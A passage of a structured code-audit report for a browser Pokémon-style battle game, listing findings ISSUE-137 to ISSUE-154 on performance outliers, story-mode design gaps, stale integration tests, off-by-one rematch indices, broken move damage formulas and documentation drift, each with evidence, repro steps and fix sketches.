**Verification**: After the fix, `node scripts/debug/perf-bench.mjs` should exit cleanly (no TypeError crash after the report write) and the parseMoveEffects median in `tests/reports/perf.md` should be < 0.5 ms.

---

## <a id="ISSUE-137"></a> ISSUE-137: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

---
id: ISSUE-137
severity: P2
category: perf
anchor_symbol: benchTurn
current_line_hint: 34
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: 727cad5b6ed7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

**Evidence**: 5 trial sets × 30 turns each (`scripts/debug/_repro/multi-bench.mjs`):
```
Boot ms: 2885
Turn loop  (5 trial medians): 16.81, 14.57, 15.20, 16.71, 19.00
Turn loop overall median: 16.75   IQR: 11.98
Turn loop overall max: 78.71
```
Original `perf-bench.mjs` reports the same shape: median 14.15 ms, max 83.62 ms. The agent mandate's "Turn loop median > 100 ms → P2" threshold is **not** hit; the median is fine. But the max being ~5× the median, with IQR ~75% of median, means there's a slow outlier path being taken occasionally.

**Repro**: `node scripts/debug/perf-bench.mjs` produces a max ≥ 80 ms about once per 30-turn batch (seen on 5/5 trials).

**Blast radius**: At 60 fps, a 80 ms hitch is ~5 dropped frames — visible as a stutter when the player presses a move button. In jsdom the cost can't be attributed to layout/paint, so it's a real JS hotspot. Likely candidates: (a) the very-first turn after `reset()` pays one-time costs (RNG re-seed, state-object re-creation, all the volatile-cleanup loops in `playTurn`); (b) Flamethrower's burn-secondary check triggers `applyStatus` with a logMsg cascade; (c) the harness's `await window.playTurn(...)` resolves microtasks at end-of-turn, and one of them is slow.

**Fix sketch**: Add a `console.time('playTurn')` / `console.timeEnd('playTurn')` wrapper around the bench's `await runTurn(...)` and re-run. Cluster the slow turns: are they always turn 0 (cold start), or are they random? If always turn 0, the fix is to drop the first sample. If random, the next step is to wrap `parseMoveEffects`, `applyStatus`, and the post-turn `updateUI` with `console.time` to find the slow branch. Reporting it as P2 because the max latency *would* be user-visible if it occurred in production timing.

**Verification**: Median and max should both be well under the 50 ms harness target. Better: max / median ratio under 3×.

---

## <a id="ISSUE-138"></a> ISSUE-138: Caged God "Key" lead has zero cost — spec says it should demand strongest mon or steep gold

---
id: ISSUE-138
severity: P2
category: design
anchor_symbol: bossCollectLead
current_line_hint: ~48593
file: battle.html
agents: [story-mode-investigator]
fingerprint: 32544380f8c1
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Caged God "Key" lead has zero cost — spec says it should demand strongest mon or steep gold

**Evidence**:
```js
// _BOSS_LEAD_FLAVOR.key body: "I won't take gold. Only your strongest Pokémon — temporarily."
function bossCollectLead(key) {
    _bossArcEnsureState();
    if (!sm.bossArc.available) return;
    if (sm.bossArc.leads[key]) return;
    ...
    const finish = function () {
        sm.bossArc.leads[key] = true;   // <- key lead: no mon taken, no gold charged
        _bossArcCheckCageUnlock();
```
STORY_MODE_FLOW.md §9 lead 3: "The key — broker won't sell it; demands the player's strongest mon (or a steep gold price)." Code charges nothing — the "temporarily take your strongest mon" line is pure flavor; no mon is escrowed/returned, no gold deducted.

**Repro**: Post-HoF, open Crucible → Post-Game Quest → "Collect Lead — The Key". Watch team/gold: unchanged. Lead flips true immediately.

**Blast radius**: The entire "hunt" tension of the boss arc. Combined with hub-side instant collection (see sibling finding), the three leads are three free button-clicks. This is the single biggest "kills the hunt feel" item the maintainer asked about.

**Fix sketch**: Make the Key lead actually escrow the player's highest-BST party mon (returned post-cage) or charge a large gold price (e.g. 25,000G) via a confirm modal. Even a token cost restores the "I paid something for this" beat. Decide with pasteur (story flow owner).

**Verification**: After collecting Key, team count drops by 1 (or gold drops); after the cage resolves, the escrowed mon returns.

---

## <a id="ISSUE-139"></a> ISSUE-139: buyArtifact has no interaction lock; double-submit safety rests solely on confirm-modal z-order

---
id: ISSUE-139
severity: P2
category: bug
anchor_symbol: buyArtifact
current_line_hint: ~50126
file: battle.html
agents: [story-mode-investigator]
fingerprint: ae5df95da412
confidence: medium
status: open
---

**Title**: buyArtifact has no interaction lock; double-submit safety rests solely on confirm-modal z-order

**Evidence**:
```js
async function buyArtifact(artId, price) {
    if (sm.artifactShopPurchasedByCity[cKey]) return;   // checked BEFORE the await
    const ok = await _storyConfirmTutorChange(...);      // no _storyTryBeginInteraction()
```

**Repro**: Per-city lock read before await showGameConfirm. Sibling facilities (enterTutor/enterLink/enterCasino/tutorChange*) all use _storyTryBeginInteraction; buyArtifact relies on the full-screen confirm modal (z-index 1200) to block a second click.

**Blast radius**: If confirm becomes non-blocking, or a second relic button is clicked before the modal renders, two purchases could pass the lock, double-debit, push two artifacts. Combined with the showGameConfirm clobber, the first awaiter can orphan.

**Fix sketch**: Wrap buyArtifact + buyItem body in if(!_storyTryBeginInteraction())return; try{...}finally{_storyEndInteraction();}.

**Verification**: Two buyArtifact calls in one tick → only one debits.

---

## <a id="ISSUE-140"></a> ISSUE-140: Casino subtitle cream text on light-gold/rose panels fails WCAG AA contrast

---
id: ISSUE-140
severity: P2
category: contrast
anchor_symbol: casino-game-subtitle
current_line_hint: ~5635
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: e06202f65435
confidence: high
status: open
---

**Title**: Casino subtitle cream text on light-gold/rose panels fails WCAG AA contrast

**Evidence**:
```css
.casino-panel.theme-flip  { background-color: #f3d873; }  /* light gold */
.casino-panel.theme-slots { background-color: #e85e7a; }  /* light rose */
.casino-panel .casino-game-subtitle { color: var(--gc-cream); /* #fff5d0 */ font-size: 11px; text-shadow: 0 1px 0 rgba(0,0,0,0.6); }
.casino-subtitle-note { color: var(--gc-cream); opacity: 0.85; font-size: 10px; }
```
`.casino-game-subtitle`/`.casino-subtitle-note` are direct children of the panel (HTML 9158, 9192). Cream `#fff5d0` on light-gold `#f3d873` is ~1.3:1 — far below the 4.5:1 AA threshold for 10–11px text. A 1px dark text-shadow does not compensate at this size. The roulette panel (dark felt) is fine; flip + slots fail.

**Repro**: Open Game Corner → Coin Flip and Slots tabs; read the rules subtitle on the light panel.

**Blast radius**: `screen-story-casino` Coin Flip + Slots tabs.

**Fix sketch**: Use a dark ink color (`var(--gc-ink)` #2c1c14) for subtitles on the light theme panels, or give the subtitle a translucent dark plate background like the prize/result strips already use.

**Verification**: Contrast checker reports >=4.5:1 for subtitle text on both flip and slots panels.

---

## <a id="ISSUE-141"></a> ISSUE-141: catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone

---
id: ISSUE-141
severity: P2
category: dx
anchor_symbol: catch-system.test
current_line_hint: tests/integration/catch-system.test.js ~33
file: tests/integration/catch-system.test.js
agents: [story-mode-investigator]
fingerprint: abac743596bd
confidence: high
status: open
---

**Title**: catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone

**Evidence**: 
```js
test('catch-system: PC cap of 10 is documented in STORY_MODE_FLOW.md', async () => {
  assert.match(flow, /cap\s+10|10\s+(slots|max|cap|mons)/i, 'spec must mention PC cap of 10');
});
```
The shipped constant is `PC_BOX_CAP = 30` (battle.html ~43126) and the spec documents **30** (STORY_MODE_FLOW.md: "cap 30 (raised from the original draft's 10...)"). The test still passes only because the regex matches the substring "10 cap" inside that historical-context sentence. The test title and intent ("PC cap of 10") are stale and the assertion provides no real coverage of `PC_BOX_CAP`. The run-engine-test SKILL advertises this file as covering "PC overflow at 10/10" — also stale.

**Repro**: `node --test tests/integration/catch-system.test.js` passes; `grep -oE "10\s+(slots|max|cap|mons)|cap\s+10" STORY_MODE_FLOW.md` returns "10 cap" (from prose documenting cap 30).

**Blast radius**: Test tooling — together with the safari-zone test, indicates a systemic pattern of integration tests substring-matching the 74KB spec doc rather than reading engine constants. No real regression coverage for PC cap or safari weights/multiplier.

**Fix sketch**: Assert against the actual `PC_BOX_CAP` constant (expose via harness/window) — e.g. `assert.equal(PC_BOX_CAP, 30)` and verify the 6/6 + 30/30 overflow message path. Update the SKILL's claim ("PC overflow at 10/10") to 30/30.

**Verification**: Change `PC_BOX_CAP` to 25 in a scratch copy — the fixed test must fail.

---

## <a id="ISSUE-142"></a> ISSUE-142: PC-cap integration test asserts cap 10 (stale) and passes only via false-positive regex match

---
id: ISSUE-142
severity: P2
category: dx
anchor_symbol: catch-system.test
current_line_hint: tests/integration/catch-system.test.js:33
file: tests/integration/catch-system.test.js
agents: [story-mode-investigator]
fingerprint: 9466f74e1032
confidence: high
status: open
---

**Title**: PC-cap integration test asserts cap 10 (stale) and passes only via false-positive regex match

**Evidence**:
```js
test('catch-system: PC cap of 10 is documented in STORY_MODE_FLOW.md', async () => {
  ...
  assert.match(flow, /cap\s+10|10\s+(slots|max|cap|mons)/i, 'spec must mention PC cap of 10');
```
The real cap is `PC_BOX_CAP = 30` and STORY_MODE_FLOW.md §7 was deliberately raised to 30. The test still claims "cap of 10" and only passes because the regex `10\s+...cap` happens to match unrelated text ("Round 10 caps the Frontier curve"). It does NOT validate the actual cap, and would keep passing even if the spec/code diverged further.

**Repro**: `node --test --test-name-pattern="PC cap of 10" tests/integration/catch-system.test.js` → ok 1. Then grep the spec: the only match is the Frontier-curve line, not a PC statement.

**Blast radius**: Save/catch regression coverage. The test gives false confidence; the genuine PC-overflow path (party 6/6 + PC 30/30 → explicit modal in `_catchHandleSuccess`) is correct but untested. (The `tests/integration/save-migration.test.js` "Pre-v15 round-trip" coverage is also worth re-checking against the current v22 chain.)

**Fix sketch**: Rewrite the test to import the engine and assert `PC_BOX_CAP === 30`, plus drive a 6/6 + 30/30 catch and assert the failure modal text. Drop the brittle spec-regex form.

**Verification**: Test fails if `PC_BOX_CAP` changes without spec update; exercises the real overflow modal.

---

## <a id="ISSUE-143"></a> ISSUE-143: Unique Master Ball is spendable on any regular wild → Caged God capture becomes a 1%-per-throw grind

---
id: ISSUE-143
severity: P2
category: bug
anchor_symbol: catchThrow
current_line_hint: 50628-50630 (no boss-only guard); cage at 49400 forcedCatchRate 0.01
file: battle.html
agents: [story-mode-investigator]
fingerprint: 52588cec9516
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Unique Master Ball is spendable on any regular wild → Caged God capture becomes a 1%-per-throw grind

**Evidence**:
```js
// catchThrow (50626-50630): no boss-only restriction on the master ball
} else {
    if (_catchState.safariMode) return;
    if (!sm.balls || (sm.balls[ballKey] | 0) <= 0) return;
    sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;     // ballKey 'master' decremented anywhere
}
// _CATCH_BALL_MULT['master'] === Infinity → guaranteed catch on ANY wild.
// bossEnterCage (49400): enterCatchEncounter(enc, ..., { boss:true, forcedCatchRate: 0.01 });
```

**Repro**: In any normal wild / roaming / Safari catch screen, throw the Master Ball — it is consumed and auto-catches. The Caged God (post-HoF) then sits at 1% per throw with no Master Ball left. (Prior-audit ISSUE-027/028; re-verified STILL PRESENT.)

**Blast radius**: Post-game Caged God arc capture pacing. Not a hard lock (1% will eventually land), but the "Master Ball is the intended answer" design is defeated by a single misclick on a route Pidgey.

**Fix sketch**: Gate Master-Ball selection — either hide/disable the Master Ball button in non-boss catch screens, OR add a confirm ("Use your only Master Ball on a wild <name>?") when `ballKey==='master' && !_catchState.bossMode`. Boss-arc throws keep it free.

---

## <a id="ISSUE-144"></a> ISSUE-144: `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts

---
id: ISSUE-144
severity: P2
category: inconsistency
anchor_symbol: catchUnlocked
current_line_hint: ~32159
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 8566e89fd047
confidence: high
status: open
---

**Title**: `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts

**Evidence**:
```js
// battle.html — every occurrence is a WRITE; no read/condition anywhere:
32159:  if (typeof sm.catchUnlocked !== 'boolean') sm.catchUnlocked = false;  // migration default
32244:  catchUnlocked: false,                                                // newStoryRun default
35749:  catchUnlocked: false,                                                // run-setup default
// (the older `sm.settings.catchMode` flag from STORY_FEATURES_INTEGRATION.md has 0 refs in code)
```
```text
STORY_MODE_FLOW.md:273  catchUnlocked: false,  // "toggles wild-route prompts; flipped on
                        // after first wild route entry or starter"
```

**Repro**: `grep -nE 'sm\.catchUnlocked' battle.html | grep -vE 'catchUnlocked\s*=[^=]'` → no read sites. The live gate for catch/route prompts is `sm.catchTutorialDone` instead.

**Blast radius**: A defined-but-unused save field. Spec §10 promises it "toggles wild-route prompts" and is "flipped on after first wild route entry or starter" — but in shipped code it stays `false` forever and nothing branches on it, so the documented behavior does not exist. Independently corroborated by `PROGRESSION_CURVE_MASTER.md` §3.1 F5 ("`sm.catchUnlocked` is dead — written, never read; live gate is `catchTutorialDone`"). Latent trap for anyone editing the catch gate per the spec.

**Fix sketch**: Either (a) update `STORY_MODE_FLOW.md` §10 to mark `catchUnlocked` as reserved/legacy and document `catchTutorialDone` as the real gate, or (b) wire the documented behavior. Given the de-scope direction, (a) is the lower-risk doc fix.

**Verification**: After fix, the spec field with a documented behavior either has a read site in code, or the spec marks it reserved.

---

## <a id="ISSUE-145"></a> ISSUE-145: `sm.settings.catchMode` toggle never implemented; catch shipped as always-on, 3 specs still gate on it

---
id: ISSUE-145
severity: P2
category: inconsistency
anchor_symbol: catchUnlocked
current_line_hint: ~34662
file: battle.html
agents: [spec-drift-auditor]
fingerprint: d2e9f5d532b4
confidence: high
status: open
---

**Title**: `sm.settings.catchMode` toggle never implemented; catch shipped as always-on, 3 specs still gate on it

**Evidence**:
```
grep -c 'catchMode' battle.html        → 0  (no form, any namespace)
docs/STORY_FEATURES_INTEGRATION.md:29  "Sold at Poke Mart only when catchMode is on"
docs/STORY_FEATURES_INTEGRATION.md:39  "PC Box when catchMode or sm.pcBox.length > 0"
docs/STORY_MODE_DESIGN_DECISIONS.md:336 "(sm.settings.catchMode && hasCaughtOnce)"
docs/STORY_MODE_CATCH_INTEGRATION_RISK.md:181 "OR sm.settings.catchMode === true"
```

**Repro**: `grep -niE 'catchMode' battle.html` returns nothing. STORY_MODE_FLOW.md §10 (line 273) reveals the actual model: catch is gated by `sm.catchTutorialDone` (set after the intro rival) and is mandatory, not an opt-in toggle. `eventsOn` (STORY_FEATURES_INTEGRATION §8) is likewise absent from code (0 hits).

**Blast radius**: Three design docs describe a catch on/off setting that does not exist; a reader implementing the PC/Mart/wild gates per spec would branch on a never-defined flag (sloppy-mode hazard — would silently create a window global, always falsy). Catch being mandatory (no "classic no-catch run") is itself an undocumented design decision.

**Fix sketch**: Either (a) purge `catchMode`/`eventsOn` from the 3 specs and document "catch is always-on after the intro rival, gated by `catchTutorialDone`"; or (b) if an opt-out is desired, implement `sm.settings.catchMode` and wire the mart/PC/wild gates the specs already describe.

**Verification**: No spec references a `catchMode`/`eventsOn` flag that is absent from code; the always-on catch model is documented.

---

## <a id="ISSUE-146"></a> ISSUE-146: autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report

---
id: ISSUE-146
severity: P2
category: dx
anchor_symbol: classify
current_line_hint: scripts/debug/autopilot-player.mjs ~83
file: scripts/debug/autopilot-player.mjs
agents: [story-mode-investigator]
fingerprint: 2d43487ea456
confidence: high
status: open
---

**Title**: autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report

**Evidence**: `classify()` (autopilot-player.mjs ~line 81-83) sets `cityScreen: scr('screen-story-city')` and `catchScreen: scr('screen-story-catch') && ...`. Story cold-opens (`_renderNarrativeOverlay`) are full-screen `z-index:9998` divs appended to `<body>` that do NOT hide the underlying `screen-story-city`. So when a cold-open is up, `classify` reports `cityScreen:true`, the pump (line 306-310) takes the city branch and calls `proceedToNextBattle()` / clicks "Leave City" — never the cold-open's "Continue →". Combined with the game-side re-entry bug (separate finding), each tick re-fires the cold-open and stacks another overlay. The 22:07 run sat at evt 7 for 270 ticks; `021-final.png` shows the "After Badge One" cold-open with an unclicked "Continue →".

**Repro**: `node scripts/debug/autopilot-player.mjs` (or inspect `agent-state/playtest/player/021-final.png` + `player-transcript.txt`: 270 ticks at evt=7).

**Blast radius**: Test tooling only — but it means the autopilot cannot validate any cold-open beat (rows 7/20/26/33/48/53/56/64) or the post-badge route flow, so real progression regressions in that band go undetected.

**Fix sketch**: In `classify`, detect a live narrative/cold-open overlay (`document.querySelector('body > div[style*="z-index:99"] button')` matching `Continue|→`) and expose it as a distinct `coldOpen:true` flag that the pump dismisses with `forceClick(page, 'Continue|→')` BEFORE the city branch. The game-side re-entry latch (separate finding) is the more durable fix.

**Verification**: Re-run the autopilot; it should clear the "After Badge One" cold-open and reach the next wild/trainer instead of stalling.

---

## <a id="ISSUE-147"></a> ISSUE-147: Comeuppance reflects 0 damage in all cases (twin Metal Burst works)

---
id: ISSUE-147
severity: P2
category: bug
anchor_symbol: Comeuppance
current_line_hint: ~23412
file: battle.html
agents: [test-coverage-filler]
fingerprint: d1fcc81fbdea
confidence: high
status: open
---

**Title**: Comeuppance reflects 0 damage in all cases (twin Metal Burst works)

**Evidence**:
```js
// battle.html:23411 — the working reflect path reads attacker.volatile + deals damage, but omits Comeuppance:
if (move.name === "Metal Burst") {
    let lastDmg = Math.max(attacker.volatile.lastPhysicalDmg || 0, attacker.volatile.lastSpecialDmg || 0);
    ...
}
// battle.html:24379 — Comeuppance only reaches here, and reads defender.volatile (the target, who took no damage) -> "But it failed!"
if (move.name === "Metal Burst" || move.name === "Comeuppance") {
    let lastDmg = Math.max(defender.volatile.lastPhysicalDmg, defender.volatile.lastSpecialDmg);
```

**Repro**: jsdom harness — player Comeuppance vs foe Body Slam (user slower so it's hit first): 0 damage. Identical setup with Metal Burst: 124 damage. (tests/moves/by-category/_drafts/prior-context.test.js excludes Comeuppance for this reason.)

**Blast radius**: Comeuppance is non-functional. Out-of-practical-scope if no story foe/move pool uses it, but the move is dead either way.

**Fix sketch**: Add `|| move.name === "Comeuppance"` to the line-23412 condition (the path that correctly uses attacker.volatile.lastDmg), or fix the 24379 fallback to read attacker.volatile rather than defender.volatile.

**Verification**: Re-run the prior-context draft with a Comeuppance reflect assertion mirroring Metal Burst's (foeDmg > 0 vs physical/special, 0 with no prior hit).

---

## <a id="ISSUE-148"></a> ISSUE-148: Single Master Ball is a free consumable — spending it pre-cage leaves boss arc as a 1%-per-throw grind

---
id: ISSUE-148
severity: P2
category: design
anchor_symbol: continuePostGame
current_line_hint: ~53501
file: battle.html
agents: [story-mode-investigator]
fingerprint: da289fe043c3
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Single Master Ball is a free consumable — spending it pre-cage leaves boss arc as a 1%-per-throw grind

**Evidence**:
```js
// continuePostGame, first post-HoF entry:
if (!sm.bossArc.available) {
    sm.bossArc.available = true;
    sm.balls.master = (sm.balls.master | 0) + 1;   // one Master Ball, ever
    showGameAlert('The Underground broker hands you a Master Ball...');
}
// throw path (any wild encounter):
sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;   // master is decremented like any ball
```
The Master Ball lives in `sm.balls.master` and is throwable at any route wild, roaming legendary, or Crucible Wild Encounter. Nothing reserves it for the cage. The boss catch overrides catchRate to 0.01, so PokéBall=1%, Ultra=2% — a stubborn grind, but not a hard lock (flee chance is low for the boss).

**Repro**: Post-HoF, go to Crucible → Wild Encounter, throw the Master Ball at a random wild (guaranteed catch). Then collect the 3 leads and enter the cage with 0 Master Balls. The only path left is 1-2% PokéBall/Ultra throws.

**Blast radius**: Maintainer's explicit question "what happens if the player has no Master Ball? Can the arc soft-lock?" — answer: not a hard soft-lock (grind is possible), but a severe pacing failure and an obvious foot-gun. The orientation tip warns "The Caged God needs the Master Ball — saved for that one fight," but nothing enforces it.

**Fix sketch**: Either (a) reserve the boss-arc Master Ball as a separate non-throwable token granted only at cage entry (cleanest — removes the foot-gun entirely), or (b) re-grant a Master Ball when the cage unlocks if `sm.balls.master === 0`, or (c) make the boss forced-catch a guaranteed catch on any ball once HP hits 0 (the 0.01 rate becomes flavor). Decide with pasteur.

**Verification**: A player who spent the Master Ball earlier can still complete the cage without a multi-dozen-throw grind.

---

## <a id="ISSUE-149"></a> ISSUE-149: Pre-boss-arc post-HoF saves may never receive the Master Ball / boss arc if parked at a city row on load

---
id: ISSUE-149
severity: P2
category: bug
anchor_symbol: continuePostGame
current_line_hint: ~53483
file: battle.html
agents: [story-mode-investigator]
fingerprint: 86b897ccf02f
confidence: low
status: fixed-claude/cagedgod-excision
---

**Title**: Pre-boss-arc post-HoF saves may never receive the Master Ball / boss arc if parked at a city row on load

**Evidence**:
```js
// migrateStoryPreV15: pre-boss-arc saves have no sm.bossArc -> climax flag = false
sm.postHofMysteryClimaxDone = !!(sm.bossArc && sm.bossArc.available);  // => false
// continuePostGame (the only place bossArc.available + Master Ball are granted) is
// reached ONLY from the HoF screen Continue button or after the climax battle.
// continueRun() -> processNextEvent(); if sm.eventIndex is parked on a City row,
// it just enterCity() — continuePostGame never fires.
```
A save made on a pre-boss-arc build that had already cleared the Champion and snapped `eventIndex` back to a city (the old post-HoF behavior) would migrate with `postHofMysteryClimaxDone = false`, but on load `processNextEvent` routes to `enterCity()` and never re-shows the HoF Continue button. The climax never fires → boss arc + Master Ball never granted → the Crucible button (gated on `sm.bossArc.available`) never appears → the player has no access to ANY post-game content.

**Repro**: Hard to construct without an archived pre-v15 post-HoF save; depends on exactly where the old champion-victory flow parked `eventIndex` (HoF row = recoverable via `showHallOfFame`; city row = stranded). Marked low confidence pending an old-save artifact.

**Blast radius**: Migration completeness for the oldest post-HoF saves. Population is likely small (boss arc shipped at v15), but the failure mode is total post-game lockout with no recovery path.

**Fix sketch**: In `load()` (or a vN migration), detect "league cleared but boss arc never granted" (e.g. `sm.badges >= 8` and a champion-clear marker true, `postHofMysteryClimaxDone` false, `bossArc` absent) and either route through `continuePostGame` once or grant the Master Ball + `bossArc.available` directly.

**Verification**: An archived pre-v15 post-HoF save loads into a state where the Crucible/Caged God are reachable.

---

## <a id="ISSUE-150"></a> ISSUE-150: Crucible "Mystery Figure" rematch uses out-of-bounds index 67 (array length is 67, max idx 66)

---
id: ISSUE-150
severity: P2
category: bug
anchor_symbol: crucibleMysteryFight
current_line_hint: ~47919
file: battle.html
agents: [story-mode-investigator]
fingerprint: 963c0784871b
confidence: high
status: open
---

**Title**: Crucible "Mystery Figure" rematch uses out-of-bounds index 67 (array length is 67, max idx 66)

**Evidence**:
```js
const STORY_POST_HOF_MYSTERY_ROW = 67;
function crucibleMysteryFight() { _crucibleBattleSetup(STORY_POST_HOF_MYSTERY_ROW, 'mystery'); }
```
The Mystery Figure (row-id 67) is at array index **66**. STORY_EVENTS_RAW has 67 rows (indices 0..66). `_crucibleBattleSetup` sets `eventIndex=67`, `STORY_EVENTS_RAW[67]` is `undefined`, the `if(!ev)` guard fires and returns to `enterCrucible()` — the Mystery rematch never launches.

**Repro**: Crucible → "Mystery Figure" → returns to Crucible with no fight.

**Blast radius**: Crucible Mystery Figure rematch (post-game).

**Fix sketch**: Use array index 66, or findIndex by row-id 67.

**Verification**: Crucible Mystery Figure launches the masked challenger.

---

## <a id="ISSUE-151"></a> ISSUE-151: Crucible "Rival Rematch" targets the Hall of Fame row (array idx 65), not the league rival

---
id: ISSUE-151
severity: P2
category: bug
anchor_symbol: crucibleRivalFight
current_line_hint: ~47920
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2a58bef716ae
confidence: high
status: open
---

**Title**: Crucible "Rival Rematch" targets the Hall of Fame row (array idx 65), not the league rival

**Evidence**:
```js
const STORY_LEAGUE_RIVAL_ROW = 65;
function crucibleRivalFight() { _crucibleBattleSetup(STORY_LEAGUE_RIVAL_ROW, 'rival'); }
```
Row-id 65 (league Rival) sits at array index **64**; index **65** is the `Hall of Fame` row. `_crucibleBattleSetup` sets `eventIndex=65`, `enterBattleEvent` sees a non-Battle row and bounces to `enterCity()`.

**Repro**: Crucible → "Rival Rematch" → drops back to the city instead of launching the rival fight.

**Blast radius**: Crucible Rival Rematch (post-game). Note `getRivalEncounterPhase` compares `storyRowIdx` against the SAME constant 65 but is fed the row-id (`ev[0]`) on the main path, so that consumer is correct — the bug is purely the `eventIndex` assignment path.

**Fix sketch**: `STORY_LEAGUE_RIVAL_ROW` is overloaded as both a row-id (correct for getRivalEncounterPhase) and an array index (wrong for _crucibleBattleSetup). Resolve the array index via findIndex inside crucibleRivalFight.

**Verification**: Crucible Rival Rematch launches a Rival battle.

---

## <a id="ISSUE-152"></a> ISSUE-152: Crush Grip doesn't scale with target HP (constant ~2 dmg); siblings do

---
id: ISSUE-152
severity: P2
category: bug
anchor_symbol: Crush Grip
current_line_hint: ~23746
file: battle.html
agents: [test-coverage-filler]
fingerprint: 052224dd33cd
confidence: high
status: open
---

**Title**: Crush Grip doesn't scale with target HP (constant ~2 dmg); siblings do

**Evidence**:
```js
// battle.html:23746 — HP-scaling power is set for Wring Out / Hard Press but NOT Crush Grip:
if ((move.name === "Wring Out" || move.name === "Hard Press") && !basePower) basePower = Math.max(1, Math.floor(120 * defender.currentHp / defender.maxHp));
// battle.html:24367 — comment wrongly claims all three are handled:
// Crush Grip / Wring Out / Hard Press: already set basePower above; no override needed
```

**Repro**: jsdom harness — Crush Grip vs full-HP Blissey and vs 30%-HP Blissey both deal ~2 (no scaling), while Wring Out scales 18→55 and Hard Press 57→187 across the same HP range.

**Blast radius**: Crush Grip is a near-zero-power move (the move-data basePower is 0 and never overridden), so it deals ~1–2 regardless of target HP.

**Fix sketch**: Add `"Crush Grip"` to the line-23746 condition so it receives the same `120 * currentHp/maxHp` power as Wring Out / Hard Press (or its real gen formula).

**Verification**: Crush Grip dmg vs 100%-HP target > dmg vs 30%-HP target (add to variable-damage draft, replacing the current "deals damage" placeholder).

---

## <a id="ISSUE-153"></a> ISSUE-153: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

---
id: ISSUE-153
severity: P2
category: refactor
anchor_symbol: deepClone
current_line_hint: ~67
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: f399b81a21b5
confidence: medium
status: open
---

**Title**: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

**Evidence**:
```js
// online-pvp.js L67-69
function deepClone(o) {
    return typeof structuredClone === 'function' ? structuredClone(o) : JSON.parse(JSON.stringify(o));
}
// Called 11x across the file, on state.pSide/fSide/playerParty/foeParty/p1GimmickIntent
// /p2GimmickIntent/draftGrades/mechanics — i.e. the entire snapshot.
// exportBattleSnapshot at L110-161 already special-cases revealedFoe (Set → Array) at L111-113,
// proving the author knows JSON drops Sets, but only one site was patched.
```

**Repro**: If a future state addition stores `state.fSide.boosts = new Map([['atk', 1]])`, `deepClone(state.fSide)` returns `{ boosts: {} }` under JSON fallback (Map serializes to `{}`) or a real Map under `structuredClone`. Cross-browser test fleet split: Chrome ≥98 gets structuredClone, older WebViews fall through to JSON. Behavior diverges silently. Same goes for `Date` objects (become ISO strings under JSON, stay Date under structuredClone), `undefined` (key dropped under JSON, preserved under structuredClone), and circular refs (JSON throws, structuredClone preserves).

**Blast radius**: Latent — no current state object known to use Set/Map/Date/undefined in the cloned regions. But the `revealedFoe` special-case shows this category of bug already bit once; any future contributor adding a `Map<MoveId, …>` to `pSide` or a `Date` for status-cure-timestamp creates a cross-environment drift bug that only manifests in older Safari/Edge.

**Fix sketch**: (a) Drop the JSON fallback entirely — `structuredClone` has been Safari ≥15.4 / Chrome ≥98 / Firefox ≥94 since early 2022, which is the same browser floor the project targets. (b) Or, replace with a project-specific safe-clone that explicitly handles Set/Map/Date (mirroring `exportBattleSnapshot`'s revealedFoe pattern for all known cases).

**Verification**: Add a unit test: build a state object with `pSide.foo = new Set([1, 2])`, `pSide.bar = new Date('2025-01-01')`, run through `exportBattleSnapshot` → `applyBattleSnapshot`, assert the round-trip preserves both. Today this fails on the JSON path.

---

## <a id="ISSUE-154"></a> ISSUE-154: Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines

---
id: ISSUE-154
severity: P2
category: dx
anchor_symbol: DESIGN_CONSISTENCY_CHECKLIST.md
current_line_hint: n/a
file: docs/design-audit/DESIGN_CONSISTENCY_CHECKLIST.md
agents: [spec-drift-auditor]
fingerprint: d4d3b918cb44
confidence: high
status: open
---

**Title**: Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines

**Evidence**:
```
DESIGN_CONSISTENCY_CHECKLIST.md (guardrail #1, repeated in Steps 1, 13):
  "Inside the <style> ... </style> block in battle.html (lines 16-4156)."
ACTUAL: grep -nE "<style|</style>" battle.html
  16:   <style>
  7831: </style>
```

**Repro**: `grep -nE "<style|</style>" battle.html` → CSS spans 16-7831, not 16-4156. The checklist is the operating manual for a 20-step CSS-only agent worktree; it cites 16-4156 as the hard "allowed edits" boundary in the global guardrails AND in Step 1 (token inventory) and Step 13 (overflow audit) scopes.

**Blast radius**: A delegated agent obeying the guardrail literally would (a) treat valid CSS in lines 4157-7831 as forbidden/out-of-scope, leaving ~half the stylesheet unaudited, or (b) mistake 4157+ for JS and refuse edits there. Either silently defeats the checklist's purpose. This is a NEW drift (checklist not in prior spec-drift audit).

**Fix sketch**: Update the three "16-4156" occurrences to "16-7831" (or to a symbol-anchored phrasing: "the single `<style> ... </style>` block"). Doc owner's edit — read-only audit.

